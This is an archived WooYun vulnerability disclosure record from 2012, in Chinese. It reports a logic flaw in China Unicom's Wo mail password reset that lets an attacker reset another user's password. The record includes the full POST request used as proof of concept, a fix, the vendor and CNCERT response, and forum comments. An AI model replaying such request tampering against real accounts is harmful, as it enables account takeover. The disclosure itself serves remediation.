{"id": 18117, "wybug_id": "wooyun-2012-09426", "wybug_title": "中国联通沃邮箱密码找回漏洞", "wybug_corp": "中国联通", "wybug_author": "Anonymous.Antisec", "wybug_date": "2012-07-10 14:24", "wybug_open_date": "2012-08-24 14:25", "wybug_type": "未授权访问/权限绕过", "wybug_level": "高", "wybug_rank_0": "10", "wybug_status": "已交由第三方合作机构(cncert国家互联网应急中心)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["设计不当导致攻击界面扩大", "认证缺陷", "盲目信任用户数据", "逻辑错误", "业务流程漏洞"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2012-07-10：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2012-07-12：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2012-07-22：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2012-08-01：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2012-08-11：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2012-08-24：\t细节向公众公开  简要描述： 直接改掉对方密码。你懂的。 详细说明：  用户通过密码找回时候会给手机发送一个验证码。验证码和密码同时提交，表单会提交下面的信息verifycode为发送到手机的验证码\n<actionType=codeVerify&newPassword=密码&verifyCode=455186&user=186手机号&domain=wo.com.cn&uid=186手机号%3A0&mbid=1341900149353186xxxxxxxwo.com.cn0.8521346392527714\n由于应用本身的逻辑缺陷，导致攻击者只要替换自己的手机号为目标的手机号就能达到修改密码的目的。poc：用186手机找回密码 抓包，保存数据包，修改里面的手机号。mbid不需要改变，然后重新提交。   漏洞证明：  \nPOST /mail/resetPassword.action HTTP/1.1User-Agent: Opera/9.80 (Windows NT 6.1; WOW64; U; zh-cn) Presto/2.10.289 Version/12.00Host: mail.wo.com.cnAccept-Language: zh-CN,zh;q=0.9,en;q=0.8Accept-Encoding: gzip, deflateReferer: http://mail.wo.com.cn/mail/resetPassword.action?actionType=indexCookie: **********************Connection: Keep-AliveContent-Length: 169X-Requested-With: XMLHttpRequestAccept: */*Content-Type: application/x-www-form-urlencodedactionType=codeVerify&newPassword=密码&verifyCode=455186&user=186手机号&domain=wo.com.cn&uid=186手机号%3A0&mbid=1341900149353186xxxxxxxwo.com.cn0.8521346392527714\n完整的表单形式类似这样。无法截图演示。   修复方案：  修改代码，检验验证码是否为发送到要修改手机的验证码。   版权声明：转载请注明来源 Anonymous.Antisec@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：10  确认时间：2012-07-12 09:39 厂商回复： 添加对漏洞的补充说明以及做出评价的理由 最新状态： 2012-07-12：上午确认未进行说明，现补充相关情况： CNVD确认并复现所述情况，转由CNCERT国家中心协调中国联通集团公司处置。按完全影响机密性进行评分，rank=7.79*1.0*1.3(较严重，存在信息泄露风险)=10.127  ", "replys": "漏洞评价：\n评论\n     2012-07-10 14:35 |    \t\txsser  \t\t\t( 普通白帽子  |\t\t\t        Rank:254 漏洞数:18        | 当我又回首一切,这个世界会好吗?)\t\t \n  不是真的\t Anonymous 吧？    \n     2012-07-10 14:47 |    \t\tsinck \t\t\t( 路人 |\t\t\t        Rank:20 漏洞数:3        | 1)\t\t \n  0.0    \n     2012-07-10 15:08 |    \t\tAnonymous.Antisec \t\t\t( 实习白帽子  |\t\t\t        Rank:48 漏洞数:8        | We are anonymous.)\t\t \n  Chinese Anonymous.    \n     2012-07-10 15:20 |    \t\t鱼化石 \t\t\t( 实习白帽子  |\t\t\t        Rank:93 漏洞数:18        | 介绍不能为空)\t\t \n  OSOSOSOSOS    \n     2012-07-10 16:39 |    \t\t猥琐 \t\t\t( 路人 |\t\t\t        Rank:6 漏洞数:2        | 学习什么的最重要！)\t\t \n  Anonymous - -!    \n     2012-07-10 16:50 |    \t\timlonghao \t\t\t( 普通白帽子  |\t\t\t        Rank:730 漏洞数:74        )\t\t \n  Anonymous......最近贵组织有何大计划。    \n     2012-07-10 16:53 |    \t\tAnonymous.Antisec \t\t\t( 实习白帽子  |\t\t\t        Rank:48 漏洞数:8        | We are anonymous.)\t\t \n  @xsser 为毛我的北邮的xxx未审核,其实那个漏洞应该算个0day 虽然官方早出补丁了，但是很多客户都没装。另外登录进去还有个命令执行漏洞，直接一步拿shell。    \n     2012-07-10 16:55 |    \t\tAnonymous.Antisec \t\t\t( 实习白帽子  |\t\t\t        Rank:48 漏洞数:8        | We are anonymous.)\t\t \n  @imlonghao 发展发展成员    \n     2012-07-10 16:58 |    \t\txsser  \t\t\t( 普通白帽子  |\t\t\t        Rank:254 漏洞数:18        | 当我又回首一切,这个世界会好吗?)\t\t \n  @Anonymous.Antisec 一看学校就不敢通过了 太多了 如果有技术方面的可以共享的偶看看    \n     2012-07-10 16:59 |    \t\txsser  \t\t\t( 普通白帽子  |\t\t\t        Rank:254 漏洞数:18        | 当我又回首一切,这个世界会好吗?)\t\t \n  @Anonymous.Antisec 你作为邮箱的通用漏洞报吧 不要报学校的 额    \n     2012-07-10 17:01 |    \t\tAnonymous.Antisec \t\t\t( 实习白帽子  |\t\t\t        Rank:48 漏洞数:8        | We are anonymous.)\t\t \n  @xsser 好的    \n     2012-07-10 17:06 |    \t\timlonghao \t\t\t( 普通白帽子  |\t\t\t        Rank:730 漏洞数:74        )\t\t \n  @xsser 学校的漏洞可以发去那个高仿站点。。    \n     2012-07-10 17:19 |    \t\txsser  \t\t\t( 普通白帽子  |\t\t\t        Rank:254 漏洞数:18        | 当我又回首一切,这个世界会好吗?)\t\t \n  @imlonghao 倒不是发哪里来 没人解决的    \n     2012-07-12 09:50 |    \t\thorseluke \t\t\t( 普通白帽子  |\t\t\t        Rank:116 漏洞数:18        | Realize the dream in earnest.)\t\t \n  @xsser CNCERT不写理由的情况很少见啊.....    \n     2012-07-12 10:03 |    \t\txsser  \t\t\t( 普通白帽子  |\t\t\t        Rank:254 漏洞数:18        | 当我又回首一切,这个世界会好吗?)\t\t \n  @horseluke 目测是忙晕了    \n     2012-08-01 10:11 |    \t\t一刀终情 \t\t\t( 普通白帽子  |\t\t\t        Rank:156 漏洞数:28        | ‮‮PKAV技术宅社区-安全爱好者)\t\t \n  我猜，未修复；用联通号码的测试个？    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 10, "Ranks": null}